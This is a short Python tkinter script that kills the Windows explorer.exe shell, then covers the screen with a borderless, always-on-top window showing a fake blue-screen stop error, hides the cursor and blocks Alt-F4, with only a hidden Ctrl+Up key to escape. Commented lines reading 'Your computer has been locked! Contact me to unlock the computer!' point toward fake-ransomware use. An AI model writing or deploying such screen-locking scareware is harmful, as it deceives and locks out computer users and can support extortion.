from tkinter import *
import os
os.system('taskkill -f -im explorer.exe')
root=Tk()
root.title("a random window that i just randomly made")
root.configure(bg="#000083")
screenWidth=root.winfo_screenwidth()
screenHeight=root.winfo_screenheight()
root.attributes('-topmost', True)
screenResolution=("{}x{}".format(screenWidth, screenHeight))
root.geometry(screenResolution)
root.minsize(800, 600)
root.overrideredirect(1)
root.config(cursor="none")
pressed_f4 = False  # Is Alt-F4 pressed?
def do_exit():
    global pressed_f4
    print('Trying to close application')
    if pressed_f4:  # Deny if Alt-F4 is pressed
        print('Denied!')
        pressed_f4 = False  # Reset variable
    else:
        close()     # Exit application
def alt_f4(event):  # Alt-F4 is pressed
    global pressed_f4
    print('Alt-F4 pressed')
    pressed_f4 = True
def close(*event):  # Exit application
    root.destroy()
    os.system("explorer.exe")
    exit()
def alttab():
    print('alttab')
root.bind('<Alt-F4>', alt_f4)
root.bind('<Control-Up>', close)
root.bind('<Alt-Tab>', alttab)
root.protocol("WM_DELETE_WINDOW",do_exit)
warnText=Label(root, text="***STOP: 0x000000D1 (0x00000000, 0xF73120AE, 0xC0000008, 0xC0000000)\n\nA problem has been detected and Windows has been shut down to prevent damage to your computer.\n\nDRIVER_IRQL_NOT_LESS_OR_EQUAL\n\nIf this is the first time you’ve seen this Stop error screen, restart your computer.\nIf this screen appears again, follow these steps:\n\nCheck to make sure any new hardware or software is properly installed.\nIf this is a new installation, ask your hardware or software manufacturer for any Windows updates you might need.\n\nIf problems continue, disable or remove any newly installed hardware or software. Disable BIOS\nmemory options such as caching or shadowing.\n\nIf you need to use Safe Mode to remove or disable components, restart your computer,\npress f8 to select Advanced Startup Options, and then select Safe Mode.\n\n*** WXYZ.SYS – Address F73120AE base at C00000000, DateStamp 36b072a3\n\nKernel Debugger Using: COM2 <Port 0x2f8, Baud Rate 19200>\nBeginning dump of physical memory\nPhysical memory dump complete. Contact your system administrator or technical support group.", font=('Consolas Bold', 17), fg="white", bg='#000083', justify=LEFT)
warnText.place(relx=0.5, rely=0.5, anchor='center')
#warnText2=Label(root, text='Do not try to shutdown your compuetr or it may just dies\nand I am not responsible for it', font=('Arial Bold', 16), fg='yellow', bg='black')
#warnText2.place(relx=0.5, rely=0.6, anchor='center')

root.mainloop()

#***STOP: 0x000000D1 (0x00000000, 0xF73120AE, 0xC0000008, 0xC0000000)\n\nA problem has been detected and Windows has been shut down to prevent damage to your computer.\n\nDRIVER_IRQL_NOT_LESS_OR_EQUAL\n\nIf this is the first time you’ve seen this Stop error screen, restart your computer. If this screen appears again, follow these steps:\n\nCheck to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any Windows updates you might need.\n\nIf problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press f8 to select Advanced Startup Options, and then select Safe Mode.\n\n*** WXYZ.SYS – Address F73120AE base at C00000000, DateStamp 36b072a3\n\nKernel Debugger Using: COM2 <Port 0x2f8, Baud Rate 19200>\nBeginning dump of physical memory\nPhysical memory dump complete. Contact your system administrator or technical support group.
#Your computer has been locked!\nContact me to unlock the computer!